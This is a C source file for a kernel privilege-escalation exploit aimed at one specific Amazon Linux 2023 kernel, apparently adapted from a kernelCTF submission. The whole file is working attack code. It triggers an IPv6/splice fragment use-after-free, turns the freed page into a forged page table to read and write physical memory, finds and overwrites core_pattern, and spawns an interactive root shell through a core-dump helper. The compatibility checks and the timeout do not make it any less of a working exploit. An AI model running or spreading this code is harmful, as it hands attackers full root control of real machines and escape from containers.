/* Modified from Google security-research kernelCTF PR #410 for the exact
 * Amazon Linux 2023 kernel named below. See README.md for provenance. */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <arpa/inet.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/udp.h>
#include <netinet/in.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>
#include "btfcheck.h"

#ifndef IPV6_MTU
#define IPV6_MTU 24
#endif
#ifndef IPV6_MTU_DISCOVER
#define IPV6_MTU_DISCOVER 23
#endif
#ifndef IPV6_PMTUDISC_DONT
#define IPV6_PMTUDISC_DONT 0
#endif
#ifndef UDP_CORK
#define UDP_CORK 1
#endif
#ifndef SPLICE_F_MORE
#define SPLICE_F_MORE 4
#endif
#ifndef SYS_memfd_create
#define SYS_memfd_create 319
#endif
#ifndef SYS_pidfd_open
#define SYS_pidfd_open 434
#endif
#ifndef SYS_pidfd_getfd
#define SYS_pidfd_getfd 438
#endif

#define PAGE_SIZE_4K 0x1000UL
#define PTE_PADDR_MASK 0x000ffffffffff000UL

#define IPV6_EXT_LEN 320
#define TARGET_MTU 1287
#define FIRST_SPLICE_LEN 919
#define SECOND_SPLICE_LEN 20
#define SHINFO_INBUF_OFF 904
#define PIPE_PAGE_BYTES 256
#define STALE_FRAGS 1
#define HOLD_PIPES 8
#define GROOM_FIRST_PAGED_BYTES 904
#define GROOM_TARGET_PAGED_BYTES 912
#define GROOM_TARGET_HEADS 16

#define VR_GB_COUNT 2UL
#define VR_ALIGN (1UL << 30)
#define VR_STRIDE (2UL << 20)
#define SLOT_BASE 32
#define SLOT_LIMIT 512

#define CORE_PATTERN_MAX 128
#define MAX_REASONABLE_PHYS (1ULL << 46)
#define MAX_PHYS_RANGES 32
#define TARGET_RELEASE "6.12.92-122.166.amzn2023.x86_64"
#define TARGET_MACHINE "x86_64"
#define TARGET_BTF "/sys/kernel/btf/vmlinux"
/* System.map: ffffffff83433540 core_pattern; physical link base is ffffffff80000000. */
#define CORE_PATTERN_LINK_PHYS 0x3433540ULL
#define PHYS_KASLR_ALIGN 0x1000000ULL

struct phys_range {
    uint64_t start;
    uint64_t end;
};

static struct phys_range phys_ranges[MAX_PHYS_RANGES];
static size_t nr_phys_ranges;
static int check_failures;
static int target_cpu = -1;
static unsigned int hard_stop_seconds;

static int make_udp6_socket(void);

static void die(const char *what)
{
    fprintf(stderr, "[-] %s failed: errno=%d (%s)\n", what, errno, strerror(errno));
    exit(1);
}

static void stop_here(const char *why)
{
    fprintf(stderr, "[!] %s; keeping the process alive to avoid teardown of stale pages\n", why);
    fflush(stderr);
    for (;;)
        pause();
}

static void hard_stop_handler(int signo)
{
    static const char msg[] =
        "[!] hard timeout reached; sending SIGSTOP (no teardown, no retry)\n";
    (void)signo;
    (void)!write(2, msg, sizeof(msg) - 1);
    kill(getpid(), SIGSTOP);
}

static int pin_cpu(int cpu)
{
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    return sched_setaffinity(0, sizeof(set), &set);
}

static ssize_t xsplice(int fd_in, int fd_out, size_t len, unsigned int flags)
{
    return syscall(SYS_splice, fd_in, NULL, fd_out, NULL, len, flags);
}

static ssize_t xtee(int fd_in, int fd_out, size_t len)
{
    return syscall(SYS_tee, fd_in, fd_out, len, 0);
}

static void write_all(int fd, const void *buf, size_t len, const char *what)
{
    const unsigned char *p = (const unsigned char *)buf;

    while (len) {
        ssize_t n = write(fd, p, len);

        if (n < 0)
            die(what);
        if (!n) {
            fprintf(stderr, "[-] short write in %s\n", what);
            exit(1);
        }
        p += n;
        len -= (size_t)n;
    }
}

static void check_result(int ok, const char *name, const char *detail)
{
    fprintf(stderr, "%s %-28s %s\n", ok ? "[+]" : "[-]", name, detail);
    if (!ok)
        check_failures++;
}

static ssize_t read_text_file(const char *path, char *buf, size_t size)
{
    int fd;
    ssize_t n;

    if (size < 2)
        return -1;
    fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0)
        return -1;
    n = read(fd, buf, size - 1);
    close(fd);
    if (n < 0)
        return -1;
    buf[n] = '\0';
    return n;
}

static int parse_phys_ranges(const char *spec)
{
    char *copy, *save = NULL, *tok;

    nr_phys_ranges = 0;
    if (!spec || !*spec)
        return -1;
    copy = strdup(spec);
    if (!copy)
        return -1;
    for (tok = strtok_r(copy, ",\n", &save); tok; tok = strtok_r(NULL, ",\n", &save)) {
        char *dash = strchr(tok, '-');
        char *end1 = NULL, *end2 = NULL;
        uint64_t start, end;

        if (!dash || nr_phys_ranges == MAX_PHYS_RANGES) {
            free(copy);
            return -1;
        }
        *dash = '\0';
        errno = 0;
        start = strtoull(tok, &end1, 0);
        end = strtoull(dash + 1, &end2, 0);
        if (errno || !end1 || *end1 || !end2 || *end2 || start >= end ||
            end > MAX_REASONABLE_PHYS) {
            free(copy);
            return -1;
        }
        for (size_t i = 0; i < nr_phys_ranges; i++) {
            if (start < phys_ranges[i].end && end > phys_ranges[i].start) {
                free(copy);
                return -1;
            }
        }
        phys_ranges[nr_phys_ranges++] = (struct phys_range){ start, end };
    }
    free(copy);
    return nr_phys_ranges ? 0 : -1;
}

static size_t phys_candidate_count(void)
{
    uint64_t residue = (CORE_PATTERN_LINK_PHYS & ~(PAGE_SIZE_4K - 1)) &
                       (PHYS_KASLR_ALIGN - 1);
    size_t count = 0;

    for (size_t i = 0; i < nr_phys_ranges; i++) {
        uint64_t p = (phys_ranges[i].start & ~(PHYS_KASLR_ALIGN - 1)) + residue;
        if (p < phys_ranges[i].start)
            p += PHYS_KASLR_ALIGN;
        for (; p < phys_ranges[i].end; p += PHYS_KASLR_ALIGN) {
            if (count == SIZE_MAX)
                return SIZE_MAX;
            count++;
        }
    }
    return count;
}

static int directory_empty(const char *path)
{
    DIR *d = opendir(path);
    struct dirent *de;

    if (!d)
        return -1;
    while ((de = readdir(d)) != NULL) {
        if (strcmp(de->d_name, ".") && strcmp(de->d_name, "..")) {
            closedir(d);
            return 0;
        }
    }
    closedir(d);
    return 1;
}

static int run_compatibility_checks(int require_ranges)
{
    struct utsname u;
    char buf[16384];
    int s = -1;
    size_t candidates = phys_candidate_count();

    check_failures = 0;
    {
        cpu_set_t set;
        CPU_ZERO(&set);
        if (sched_getaffinity(0, sizeof(set), &set) == 0) {
            for (int i = 0; i < CPU_SETSIZE; i++) {
                if (CPU_ISSET(i, &set)) {
                    target_cpu = i;
                    break;
                }
            }
        }
        if (target_cpu >= 0) {
            char detail[64];
            snprintf(detail, sizeof(detail), "will pin to allowed CPU %d", target_cpu);
            check_result(1, "CPU affinity", detail);
        } else {
            check_result(0, "CPU affinity", "no allowed CPU found");
        }
    }
    if (uname(&u) == 0) {
        check_result(strcmp(u.machine, TARGET_MACHINE) == 0, "architecture", u.machine);
        check_result(strcmp(u.release, TARGET_RELEASE) == 0, "exact kernel release", u.release);
    } else {
        check_result(0, "uname", strerror(errno));
    }

    if (read_text_file("/proc/cpuinfo", buf, sizeof(buf)) >= 0)
        check_result(strstr(buf, " la57") == NULL && strstr(buf, "la57 ") == NULL,
                     "four-level paging", "CPU lacks LA57; five-level mode cannot be active");
    else
        check_result(0, "four-level paging", "cannot read /proc/cpuinfo");

    check_result(btf_check_required(TARGET_BTF, 1) == 0,
                 "target BTF/layout", TARGET_BTF);

    if (read_text_file("/proc/sys/net/ipv6/conf/all/disable_ipv6", buf, sizeof(buf)) >= 0)
        check_result(buf[0] == '0', "IPv6 enabled", buf[0] == '0' ? "yes" : "disabled");
    else
        check_result(0, "IPv6 enabled", "sysctl unreadable");
    s = make_udp6_socket();
    check_result(s >= 0, "UDPv6/SRH socket", s >= 0 ? "usable on ::1" : strerror(errno));
    if (s >= 0)
        close(s);

    if (read_text_file("/proc/self/uid_map", buf, sizeof(buf)) >= 0) {
        unsigned long inside = 0, outside = 0, length = 0;
        int exact = sscanf(buf, "%lu %lu %lu", &inside, &outside, &length) == 3 &&
                    inside == 1000 && outside == 1000 && length == 1;
        check_result(exact, "user namespace mapping",
                     exact ? "1000 -> 1000, length 1" : "does not match target mapping");
    } else
        check_result(0, "user namespace mapping", "uid_map unreadable");
    if (read_text_file("/proc/self/gid_map", buf, sizeof(buf)) >= 0) {
        unsigned long inside = 0, outside = 0, length = 0;
        int exact = sscanf(buf, "%lu %lu %lu", &inside, &outside, &length) == 3 &&
                    inside == 1000 && outside == 1000 && length == 1;
        check_result(exact, "group namespace mapping",
                     exact ? "1000 -> 1000, length 1" : "does not match target mapping");
    } else
        check_result(0, "group namespace mapping", "gid_map unreadable");
    if (read_text_file("/proc/sys/user/max_user_namespaces", buf, sizeof(buf)) >= 0)
        check_result(strtoull(buf, NULL, 10) > 0, "user namespaces enabled", buf);
    else
        check_result(0, "user namespaces enabled", "max_user_namespaces unreadable");

    if (read_text_file("/proc/cmdline", buf, sizeof(buf)) >= 0) {
        int safe = !strstr(buf, "init_on_alloc=1") && !strstr(buf, "init_on_free=1") &&
                   !strstr(buf, "page_poison=1");
        check_result(safe, "page initialization", safe ?
                     "official config defaults off; no enabling boot override" :
                     "unsafe boot override present");
    } else {
        check_result(0, "page initialization", "cannot read /proc/cmdline");
    }

    if (read_text_file("/proc/self/status", buf, sizeof(buf)) >= 0) {
        check_result(strstr(buf, "NoNewPrivs:\t0") != NULL, "no_new_privs", "must be 0");
        check_result(strstr(buf, "Seccomp:\t0") != NULL, "seccomp", "must be disabled");
    } else {
        check_result(0, "process security state", "status unreadable");
    }

    {
        int empty = directory_empty("/sys/kernel/livepatch");
        check_result(empty == 1, "livepatch state", empty == 1 ? "none loaded" :
                     (empty == 0 ? "livepatch objects present" : "unreadable"));
    }
    if (read_text_file("/proc/sys/kernel/core_pattern", buf, sizeof(buf)) >= 0)
        check_result(strlen(buf) > 0 && strlen(buf) < CORE_PATTERN_MAX,
                     "core_pattern readable", "value fits 128-byte object");
    else
        check_result(0, "core_pattern readable", "unreadable");

    check_result(CORE_PATTERN_LINK_PHYS == 0x3433540ULL && PHYS_KASLR_ALIGN == 0x1000000ULL,
                 "official symbol/config", "System.map offset 0x3433540; 16 MiB alignment");
    if (require_ranges || nr_phys_ranges) {
        char detail[128];
        snprintf(detail, sizeof(detail), "%zu candidates; capacity %d", candidates,
                 SLOT_LIMIT - SLOT_BASE);
        check_result(nr_phys_ranges > 0 && candidates > 0 &&
                     candidates <= (size_t)(SLOT_LIMIT - SLOT_BASE),
                     "physical RAM ranges", detail);
    }

    fprintf(stderr, "[*] compatibility result: %s (%d failure%s)\n",
            check_failures ? "FAIL - exploit path remains locked" : "PASS",
            check_failures, check_failures == 1 ? "" : "s");
    return check_failures ? -1 : 0;
}

static int set_srh_len(int fd)
{
    unsigned char opt[IPV6_EXT_LEN];
    int rest, nseg, tlv;
    struct in6_addr loopback;

    memset(opt, 0, sizeof(opt));
    rest = IPV6_EXT_LEN - 8;
    nseg = rest / 16;
    tlv = rest - nseg * 16;
    if (tlv && tlv < 2) {
        nseg--;
        tlv += 16;
    }

    opt[1] = (unsigned char)((IPV6_EXT_LEN - 8) / 8);
    opt[2] = 4;
    opt[4] = (unsigned char)(nseg - 1);

    if (inet_pton(AF_INET6, "::1", &loopback) != 1)
        return -1;
    for (int i = 0; i < nseg; i++)
        memcpy(opt + 8 + 16 * i, &loopback, sizeof(loopback));
    if (tlv) {
        int off = 8 + 16 * nseg;

        opt[off] = 0;
        opt[off + 1] = (unsigned char)(tlv - 2);
    }

    return setsockopt(fd, IPPROTO_IPV6, IPV6_RTHDR, opt, IPV6_EXT_LEN);
}

static int make_udp6_socket(void)
{
    struct sockaddr_in6 sa;
    int fd, mtu, dont;

    fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    if (fd < 0)
        return -1;

    dont = IPV6_PMTUDISC_DONT;
    if (setsockopt(fd, IPPROTO_IPV6, IPV6_MTU_DISCOVER, &dont, sizeof(dont)) != 0) {
        close(fd);
        return -1;
    }

    mtu = TARGET_MTU;
    if (setsockopt(fd, IPPROTO_IPV6, IPV6_MTU, &mtu, sizeof(mtu)) != 0) {
        close(fd);
        return -1;
    }

    if (set_srh_len(fd) != 0) {
        close(fd);
        return -1;
    }

    memset(&sa, 0, sizeof(sa));
    sa.sin6_family = AF_INET6;
    sa.sin6_port = htons(12345);
    memcpy(&sa.sin6_addr, &in6addr_loopback, sizeof(in6addr_loopback));
    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        close(fd);
        return -1;
    }

    return fd;
}

static void prepare_core_helper(void)
{
    int memfd, self;

    memfd = syscall(SYS_memfd_create, "kctf-helper", 0);
    if (memfd < 0)
        die("memfd_create");

    self = open("/proc/self/exe", O_RDONLY);
    if (self < 0)
        die("open self");

    for (;;) {
        unsigned char tmp[4096];
        ssize_t n = read(self, tmp, sizeof(tmp));

        if (n < 0)
            die("read self");
        if (!n)
            break;
        write_all(memfd, tmp, (size_t)n, "copy helper");
    }

    close(self);
    if (dup2(memfd, 666) != 666)
        die("dup2 helper");
    close(memfd);
}

static int helper_main(const char *pid_text)
{
    int pid = atoi(pid_text);
    int pfd = syscall(SYS_pidfd_open, pid, 0);
    int in, out, errfd;

    if (pfd < 0)
        return 1;
    in = syscall(SYS_pidfd_getfd, pfd, 0, 0);
    out = syscall(SYS_pidfd_getfd, pfd, 1, 0);
    errfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
    if (in < 0 || out < 0 || errfd < 0)
        return 1;
    dup2(in, 0);
    dup2(out, 1);
    dup2(errfd, 2);

    {
        const char msg[] = "[+] initial-namespace core helper is running; starting shell\n";
        (void)!write(1, msg, sizeof(msg) - 1);
    }
    execl("/bin/sh", "sh", "-i", NULL);
    execl("/usr/bin/sh", "sh", "-i", NULL);
    perror("execl shell");
    return 1;
}

static int prepare_stale_frag_descriptors(int src_rd)
{
    int s = make_udp6_socket();
    int gp[2];
    int one = 1;
    size_t total = GROOM_FIRST_PAGED_BYTES +
                   GROOM_TARGET_HEADS * GROOM_TARGET_PAGED_BYTES;
    size_t left = total;
    ssize_t n;

    if (s < 0)
        die("groom socket");
    if (pipe(gp) != 0)
        die("groom pipe");
    fcntl(gp[1], F_SETPIPE_SZ, 1 << 20);

    setsockopt(s, IPPROTO_UDP, UDP_CORK, &one, sizeof(one));
    while (left) {
        size_t want = left < PIPE_PAGE_BYTES ? left : PIPE_PAGE_BYTES;

        if (xtee(src_rd, gp[1], want) != (ssize_t)want)
            die("groom tee fill");
        left -= want;
    }

    n = xsplice(gp[0], s, total, SPLICE_F_MORE);
    if (n != (ssize_t)total)
        die("groom splice");

    close(gp[0]);
    close(gp[1]);
    return s;
}

struct pt_win {
    unsigned char *raw;
    unsigned char *aligned;
    unsigned char *base;
    unsigned char *scratch;
    size_t scratch_len;
    uint64_t flags;
    uint64_t nx;
    int slot;
    int pte_wr;
};

static struct pt_win win;
static uint64_t core_pattern_link_phys;
static uint64_t phys_kaslr_align;
static unsigned char expected_core_pattern[CORE_PATTERN_MAX];
static size_t expected_core_pattern_len;
static volatile unsigned char *core_pattern_mapping;

static void read_current_core_pattern(void)
{
    int fd = open("/proc/sys/kernel/core_pattern", O_RDONLY | O_CLOEXEC);
    ssize_t n;

    if (fd < 0)
        die("open core_pattern");
    n = read(fd, expected_core_pattern, sizeof(expected_core_pattern) - 1);
    close(fd);
    if (n <= 0)
        die("read core_pattern");
    while (n > 0 && (expected_core_pattern[n - 1] == '\n' ||
                     expected_core_pattern[n - 1] == '\r'))
        n--;
    if (!n)
        stop_here("the current core_pattern is empty");
    expected_core_pattern[n] = '\0';
    expected_core_pattern_len = (size_t)n;
}

static void setup_target_data(void)
{
    core_pattern_link_phys = CORE_PATTERN_LINK_PHYS;
    phys_kaslr_align = PHYS_KASLR_ALIGN;
    if (!core_pattern_link_phys || phys_kaslr_align < PAGE_SIZE_4K ||
        (phys_kaslr_align & (phys_kaslr_align - 1)))
        stop_here("embedded physical layout data is invalid");
    read_current_core_pattern();

    fprintf(stderr, "[+] Amazon target: %s core_pattern link=0x%lx "
            "physical-align=0x%lx current=%s\n", TARGET_RELEASE,
            (unsigned long)core_pattern_link_phys,
            (unsigned long)phys_kaslr_align, expected_core_pattern);
}

static void prepare_pt_reclaim_area(void)
{
    uint64_t gib = VR_ALIGN;

    win.raw = (unsigned char *)mmap(NULL, (VR_GB_COUNT + 1) * gib,
                                    PROT_READ | PROT_WRITE,
                                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE,
                                    -1, 0);
    if (win.raw == MAP_FAILED)
        die("mmap vr");

    madvise(win.raw, (VR_GB_COUNT + 1) * gib, MADV_NOHUGEPAGE);
    win.aligned = (unsigned char *)(((uintptr_t)win.raw + gib - 1) & ~(gib - 1));

    for (unsigned long i = 0; i < VR_GB_COUNT; i++)
        win.aligned[i * gib] = 1;

    win.scratch_len = 64 * PAGE_SIZE_4K;
    win.scratch = (unsigned char *)mmap(NULL, win.scratch_len,
                                        PROT_READ | PROT_WRITE,
                                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (win.scratch == MAP_FAILED)
        win.scratch = NULL;
    else
        for (size_t i = 0; i < win.scratch_len; i += PAGE_SIZE_4K)
            win.scratch[i] = 1;
}

static void full_tlb_flush(void)
{
    if (!win.scratch)
        return;
    mprotect(win.scratch, win.scratch_len, PROT_READ);
    mprotect(win.scratch, win.scratch_len, PROT_READ | PROT_WRITE);
}

static volatile unsigned char *map_phys_page(uint64_t phys)
{
    uint64_t pte;
    int slot;

    if (win.slot >= SLOT_LIMIT)
        return NULL;

    slot = win.slot++;
    pte = (phys & PTE_PADDR_MASK) | win.flags | win.nx;
    write_all(win.pte_wr, &pte, sizeof(pte), "forge pte");
    full_tlb_flush();

    return win.base + (uint64_t)slot * PAGE_SIZE_4K;
}

static int looks_like_leaf_pte(uint64_t pte)
{
    uint64_t phys = pte & PTE_PADDR_MASK;

    return (pte & 1) && phys && phys < MAX_REASONABLE_PHYS;
}

static int install_dirty_pagetable_from_pipe(int pipe_rd, int pipe_wr)
{
    unsigned char pte_bytes[31 * sizeof(uint64_t)];
    volatile uint64_t *ptes = (volatile uint64_t *)pte_bytes;
    unsigned char *candidate;
    int first = -1;
    ssize_t got;

    if (!win.aligned)
        die("prepare_pt_reclaim_area");

    /* The stale pipe-buffer page should become this fresh leaf PTE page. */
    candidate = win.aligned + VR_STRIDE;
    fprintf(stderr, "[*] faulting one leaf PTE page candidate at %p\n", candidate);
    for (int i = 0; i < 31; i++)
        candidate[(uint64_t)i * PAGE_SIZE_4K] = 0x55;

    got = read(pipe_rd, pte_bytes, sizeof(pte_bytes));
    if (got < 0)
        die("read reclaimed pipe page");
    if (got != (ssize_t)sizeof(pte_bytes))
        stop_here("pipe read was short while checking reclaimed page");

    for (int i = 0; i < (int)sizeof(pte_bytes); i++) {
        if (pte_bytes[i] != 0x41) {
            first = -2;
            break;
        }
    }
    if (first != -2)
        stop_here("pipe page was not reused as the selected leaf page table");

    for (int i = 0; i < 31; i++) {
        if (looks_like_leaf_pte(ptes[i])) {
            first = i;
            break;
        }
    }
    if (first < 0)
        stop_here("reclaimed pipe page did not expose plausible PTEs");

    fprintf(stderr, "[+] reclaimed leaf PT through pipe: first pte[%d]=0x%lx\n",
            first, (unsigned long)ptes[first]);

    win.pte_wr = pipe_wr;
    win.base = candidate;
    win.flags = ptes[first] & 0xfffUL;
    win.nx = ptes[first] & (1ULL << 63);
    win.slot = SLOT_BASE;

    return 0;
}

static uint64_t find_core_pattern_phys(void)
{
    uint64_t link_page = core_pattern_link_phys & ~(PAGE_SIZE_4K - 1);
    uint64_t page_residue = link_page & (phys_kaslr_align - 1);
    size_t core_offset = core_pattern_link_phys & (PAGE_SIZE_4K - 1);
    size_t candidate_count = 0;

    if (!core_pattern_link_phys || !phys_kaslr_align ||
        !expected_core_pattern_len)
        stop_here("kernelXDK target data was not initialized");
    if (core_offset < sizeof(uint32_t) ||
        core_offset + expected_core_pattern_len + 1 > PAGE_SIZE_4K)
        stop_here("core_pattern link offset is invalid");

    for (size_t range = 0; range < nr_phys_ranges; range++) {
        uint64_t phys = (phys_ranges[range].start & ~(phys_kaslr_align - 1)) +
                        page_residue;

        if (phys < phys_ranges[range].start)
            phys += phys_kaslr_align;
        for (; phys < phys_ranges[range].end; phys += phys_kaslr_align)
            candidate_count++;
    }
    if (candidate_count > SLOT_LIMIT - SLOT_BASE)
        stop_here("physical KASLR candidates do not fit in the leaf PTE page");

    fprintf(stderr, "[*] scanning all RAM for %zu physical KASLR candidates "
            "at page offset 0x%zx\n", candidate_count, core_offset);

    for (size_t range = 0; range < nr_phys_ranges; range++) {
        uint64_t phys = (phys_ranges[range].start & ~(phys_kaslr_align - 1)) +
                        page_residue;

        if (phys < phys_ranges[range].start)
            phys += phys_kaslr_align;
        for (; phys < phys_ranges[range].end; phys += phys_kaslr_align) {
            volatile unsigned char *page = map_phys_page(phys);
            volatile unsigned char *core;
            volatile unsigned char *size_marker;
            int matched = 1;

            if (!page)
                stop_here("ran out of PTE slots while scanning physical RAM");
            core = page + core_offset;
            size_marker = core - sizeof(uint32_t);
            if (size_marker[0] != 0x80 || size_marker[1] != 0x00 ||
                size_marker[2] != 0x00 || size_marker[3] != 0x00)
                continue;
            for (size_t i = 0; i < expected_core_pattern_len; i++) {
                if (core[i] != expected_core_pattern[i]) {
                    matched = 0;
                    break;
                }
            }
            if (!matched || core[expected_core_pattern_len] != '\0')
                continue;

            fprintf(stderr, "[+] core_pattern object at phys 0x%lx "
                    "(relocation 0x%lx)\n",
                    (unsigned long)(phys + core_offset),
                    (unsigned long)(phys + core_offset -
                                    core_pattern_link_phys));
            core_pattern_mapping = core;
            return phys + core_offset;
        }
    }

    return 0;
}

static void write_phys_bytes(uint64_t phys, const void *src, size_t len)
{
    while (len) {
        uint64_t page_phys = phys & ~(PAGE_SIZE_4K - 1);
        size_t off = phys & (PAGE_SIZE_4K - 1);
        size_t n = PAGE_SIZE_4K - off;
        volatile unsigned char *dst_page = map_phys_page(page_phys);

        if (!dst_page)
            stop_here("ran out of PTE slots while writing physical memory");
        if (n > len)
            n = len;
        memcpy((void *)(dst_page + off), src, n);
        src = (const unsigned char *)src + n;
        phys += n;
        len -= n;
    }
}

static void overwrite_core_pattern(void)
{
    const char pattern[] = "|/proc/%P/fd/666 --core-helper %P";
    uint64_t core_phys = find_core_pattern_phys();

    if (!core_phys)
        stop_here("core_pattern scan did not find the current object");

    write_phys_bytes(core_phys, pattern, sizeof(pattern));
    fprintf(stderr, "[+] core_pattern overwritten with %s\n", pattern);
}

static void restore_core_pattern(void)
{
    if (!core_pattern_mapping)
        stop_here("cannot restore core_pattern: mapping missing");
    memcpy((void *)core_pattern_mapping, expected_core_pattern,
           expected_core_pattern_len + 1);
    __sync_synchronize();
    fprintf(stderr, "[+] core_pattern restored to original value: %s\n",
            expected_core_pattern);
}

static void trigger_ipv6_frag_unref(void)
{
    int wp[2], hold[HOLD_PIPES][2], held = 0;
    int s, groom_socket, tp1[2], tp2[2], one = 1;
    unsigned char marker[PIPE_PAGE_BYTES];
    unsigned char trig[1024];
    ssize_t n1, n2;

    if (pipe(wp) != 0)
        die("source pipe");
    fcntl(wp[1], F_SETPIPE_SZ, 1 << 20);

    memset(marker, 0x41, sizeof(marker));
    write_all(wp[1], marker, sizeof(marker), "source pipe seed");

    for (; held < HOLD_PIPES; held++) {
        if (pipe(hold[held]) != 0)
            break;
        fcntl(hold[held][1], F_SETPIPE_SZ, 1 << 20);
        if (xtee(wp[0], hold[held][1], PIPE_PAGE_BYTES) != PIPE_PAGE_BYTES) {
            close(hold[held][0]);
            close(hold[held][1]);
            break;
        }
    }
    fprintf(stderr, "[*] held %d extra pipe refs\n", held);
    if (held != HOLD_PIPES)
        stop_here("not enough held pipe refs");

    prepare_pt_reclaim_area();
    fprintf(stderr, "[*] page-table reclaim area prepared\n");

    s = make_udp6_socket();
    if (s < 0)
        die("trigger socket");
    if (pipe(tp1) != 0 || pipe(tp2) != 0)
        die("trigger pipes");
    fcntl(tp1[1], F_SETPIPE_SZ, 1 << 20);
    fcntl(tp2[1], F_SETPIPE_SZ, 1 << 20);

    memset(trig, 0, sizeof(trig));
    trig[SHINFO_INBUF_OFF + 2] = STALE_FRAGS;
    write_all(tp1[1], trig, FIRST_SPLICE_LEN, "trigger part1");
    write_all(tp2[1], trig, SECOND_SPLICE_LEN, "trigger part2");

    setsockopt(s, IPPROTO_UDP, UDP_CORK, &one, sizeof(one));
    fprintf(stderr, "[*] preparing one ordered stale frag descriptor source\n");
    groom_socket = prepare_stale_frag_descriptors(wp[0]);

    /*
     * The 16 target heads use the dedicated skbuff_small_head cache.  The
     * 320-byte SRH uses kmalloc-512 and the first trigger head uses
     * kmalloc-1k, so the second splice reuses a groomed target head.
     */
    close(groom_socket);
    n1 = xsplice(tp1[0], s, FIRST_SPLICE_LEN, SPLICE_F_MORE);
    n2 = xsplice(tp2[0], s, SECOND_SPLICE_LEN, SPLICE_F_MORE);
    fprintf(stderr, "[*] trigger splice1=%zd splice2=%zd\n", n1, n2);
    if (n1 != (ssize_t)FIRST_SPLICE_LEN)
        stop_here("first trigger splice was short");
    if (n2 != (ssize_t)SECOND_SPLICE_LEN)
        stop_here("second trigger splice was short");

    close(s);
    close(tp1[0]);
    close(tp1[1]);
    close(tp2[0]);
    close(tp2[1]);

    for (int i = 0; i < held; i++) {
        close(hold[i][0]);
        close(hold[i][1]);
    }
    fprintf(stderr, "[*] closed held pipe refs; trying PTE reclaim\n");

    install_dirty_pagetable_from_pipe(wp[0], wp[1]);
}

static void run_core_pattern_payload(void)
{
    struct rlimit lim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY,
    };
    pid_t pid;

    setrlimit(RLIMIT_CORE, &lim);
    prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);

    pid = fork();
    if (pid < 0)
        die("fork crash child");
    if (pid == 0) {
        prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);
        *(volatile int *)0 = 0x1337;
        _exit(1);
    }

    waitpid(pid, NULL, 0);
    fprintf(stderr, "[*] crash child reaped\n");
    restore_core_pattern();
    alarm(0);
    fprintf(stderr, "[+] hard-stop timer disarmed; interactive helper may remain active\n");
}

static void usage(const char *prog)
{
    fprintf(stderr,
            "usage:\n"
            "  %s --check-only --phys-ranges START-END[,START-END...]\n"
            "  %s --check-only --phys-ranges-file FILE\n"
            "  %s --execute-once --timeout-seconds N --phys-ranges START-END[,START-END...]\n",
            prog, prog, prog);
}

int main(int argc, char **argv)
{
    int check_only = 0, execute_once = 0;
    const char *range_spec = NULL;
    char range_file_buf[16384];

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    if (argc == 3 && strcmp(argv[1], "--core-helper") == 0)
        return helper_main(argv[2]);

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--check-only") == 0) {
            check_only = 1;
        } else if (strcmp(argv[i], "--execute-once") == 0) {
            execute_once = 1;
        } else if (strcmp(argv[i], "--phys-ranges") == 0 && i + 1 < argc) {
            range_spec = argv[++i];
        } else if (strncmp(argv[i], "--phys-ranges=", 14) == 0) {
            range_spec = argv[i] + 14;
        } else if (strcmp(argv[i], "--phys-ranges-file") == 0 && i + 1 < argc) {
            if (read_text_file(argv[++i], range_file_buf, sizeof(range_file_buf)) < 0) {
                fprintf(stderr, "[-] cannot read physical range file: %s\n", strerror(errno));
                return 2;
            }
            range_spec = range_file_buf;
        } else if (strcmp(argv[i], "--timeout-seconds") == 0 && i + 1 < argc) {
            char *end = NULL;
            unsigned long value = strtoul(argv[++i], &end, 10);
            if (!end || *end || value == 0 || value > 600) {
                fprintf(stderr, "[-] timeout must be between 1 and 600 seconds\n");
                return 2;
            }
            hard_stop_seconds = (unsigned int)value;
        } else {
            usage(argv[0]);
            return 2;
        }
    }
    if (check_only == execute_once) {
        usage(argv[0]);
        return 2;
    }
    if (execute_once && !hard_stop_seconds) {
        fprintf(stderr, "[-] --timeout-seconds is mandatory for execution\n");
        return 2;
    }
    if (parse_phys_ranges(range_spec) != 0) {
        fprintf(stderr, "[-] valid explicit System-RAM ranges are required; no defaults are assumed\n");
        return 2;
    }

    fprintf(stderr, "[*] Amazon Linux 2023 CVE-2026-53362 compatibility gate\n");
    if (run_compatibility_checks(1) != 0)
        return 3;
    if (check_only) {
        fprintf(stderr, "[+] check-only completed; vulnerability was not triggered\n");
        return 0;
    }

    fprintf(stderr, "[!] executing the single authorized exploit attempt\n");
    signal(SIGALRM, hard_stop_handler);
    alarm(hard_stop_seconds);
    if (pin_cpu(target_cpu) != 0)
        die("sched_setaffinity");

    setup_target_data();
    prepare_core_helper();
    trigger_ipv6_frag_unref();
    overwrite_core_pattern();
    run_core_pattern_payload();

    stop_here("payload fired and core_pattern restored; retaining stale page-table state");
    return 0;
}
